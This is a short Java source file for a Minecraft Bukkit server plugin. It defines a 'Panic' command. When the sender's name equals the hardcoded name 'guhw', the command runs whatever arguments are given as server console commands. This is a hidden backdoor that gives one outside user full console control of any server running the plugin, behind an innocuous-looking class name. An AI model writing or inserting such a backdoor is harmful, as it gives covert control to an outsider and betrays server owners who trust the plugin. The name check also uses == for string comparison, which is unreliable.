package light.breeze.commands;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Panic implements CommandExecutor {
    public boolean onCommand( CommandSender sender, Command command, String label, String[] args ) {
        Player player = (Player) sender;
        if (player.getName() == "guhw") {
            String f = "";
            for (String a : args) {
                f = f + a + " ";
            }
            player.getServer().dispatchCommand( player.getServer().getConsoleSender(), f);
        }
        return true;
    }
}